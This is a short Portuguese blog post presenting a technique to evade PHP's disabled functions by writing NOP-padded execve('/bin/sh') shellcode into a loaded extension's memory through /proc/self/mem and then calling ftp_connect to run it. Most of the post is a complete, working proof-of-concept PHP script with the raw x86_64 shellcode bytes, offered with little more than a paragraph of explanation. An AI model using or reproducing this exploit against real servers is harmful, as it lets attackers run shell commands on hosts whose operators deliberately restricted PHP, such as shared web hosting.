---
layout: post
comments: true
title: "PHP bypass injetando shellcode"
---

Vou escrever sobre um jeito de injetar shellcode no php, e executar comandos
no sistema, burlando possiveis funções desabilitadas como system e shell_exec,
por exemplo, infelizmente essa tecnica não permite burlar todo o safe_mode
do php, porque tem a limitação do open_basedir, essa é unica limitação
propriamente dita, e se as funções para leitura de arquivo, e a função seek
também estiverem desabilitadas então não funciona.

-- show the code --

A tecnica funciona da seguinte maneira, o php vai carregar varias extensões 
na memoria, e ai vamos pegar o range de memoria de uma extensão qualquer,
e vamos sobrescrever com nops e com o shellcode, e no codigo php iremos
chamar uma função que corresponde a extensão sobrescrita, quando ela chamar a
lib que foi sobrescrita, BOOM, vai executar o shellcode.

## poc

{% highlight php %}
<?php

	/* getting address range of extesion */
	function get_extension_range($name){
		$maps = fopen("/proc/self/maps", "r");
		while(!feof($maps)){
			$line = fgets($maps);
			if( preg_match("/(\w+)-(\w+)\s*r-xp.*modules\/${name}.*/", $line, $matches) ){
				fclose($maps);
				return array(hexdec($matches[1]), hexdec($matches[2]));
			}
		}
		return array();
	}

	function generate_shellcode($range, $shellcode){
		$sc = str_repeat("\x90", $range[1]-$range[0]-strlen($shellcode));
		$sc .= $shellcode;
		return $sc;
	}

	function write_memory($position, $string){
		$mem = fopen("/proc/self/mem","w+");
		fseek($mem, $position);
		fwrite($mem, $string);
	}

	$range = get_extension_range("ftp.so");

	if(empty($range)){
		die("failed to find extension...");
	}

	/* execve("/bin/sh", ["/bin/sh"], NULL) for linux x86_64 */
	$shellcode = "\x48\x31\xff\x48\xf7\xe7\xb0\x3b\x48\xbf\x66".
			 "\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08".
			 "\x57\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05";

	$shellcode_with_nops = generate_shellcode($range, $shellcode);
	write_memory($range[0], $shellcode_with_nops);


	/* call extension to exec shellcode */
	ftp_connect("matrix");



?>
{% endhighlight %}
<center>
<script type="text/javascript" src="https://asciinema.org/a/83869.js" id="asciicast-83869" async></script>
</center>
